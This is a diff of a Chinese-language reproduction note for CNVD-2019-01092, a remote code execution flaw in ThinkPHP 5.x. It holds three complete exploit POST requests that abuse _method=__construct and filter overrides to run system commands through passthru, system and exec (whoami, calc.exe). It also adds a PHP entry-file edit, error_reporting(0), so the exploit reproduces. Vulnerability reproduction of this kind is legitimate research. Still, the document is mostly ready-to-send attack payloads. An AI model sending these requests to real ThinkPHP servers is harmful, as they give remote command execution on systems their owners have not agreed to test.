@@ -6,7 +6,7 @@ CNVD-2019-01092
 
 ```
 POST /tp5010/public/index.php?s=index/index/index HTTP/1.1
-Host: 10.67.9.24
+Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -24,7 +24,7 @@ s=whoami&filter%5B%5D=passthru&_method=__construct&method=
 
 ```
 POST /tp5023/public/index.php?s=captcha HTTP/1.1
-Host: 10.67.9.24
+Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -44,7 +44,7 @@ _method=__construct&filter[]=system&method=GET&get[]=whoami
 
 ```
 POST /tp5132/public/index.php HTTP/1.1
-Host: 10.67.8.117:8889
+Host: 127.0.0.1
 Content-Length: 58
 Cache-Control: max-age=0
 Origin: http://10.67.9.24
@@ -59,9 +59,20 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 
 c=exec&f=calc.exe&&_method=filter&
 ```
+
 设置`error_reporting(0);`版本不同，位置不一样，一般在start.php或者index.php
-![Snipaste_2019-01-15_17-40-44.png](https://i.loli.net/2019/01/15/5c3dbc72305e1.png)
-![Snipaste_2019-01-15_17-41-27.png](https://i.loli.net/2019/01/15/5c3dbccf8756e.png)
-![Snipaste_2019-01-15_17-38-28.png](https://i.loli.net/2019/01/15/5c3dbd30d80fb.png)
+
+```
+// [ 应用入口文件 ]
+namespace think;
+
+// 加载基础文件
+require __DIR__ . '/../thinkphp/base.php';
+error_reporting(0);                                                 ----》添加这一行，即可复现
+// 支持事先使用静态方法设置Request对象和Config对象
+
+// 执行应用并响应
+Container::get('app')->run()->send();
+```
 
 
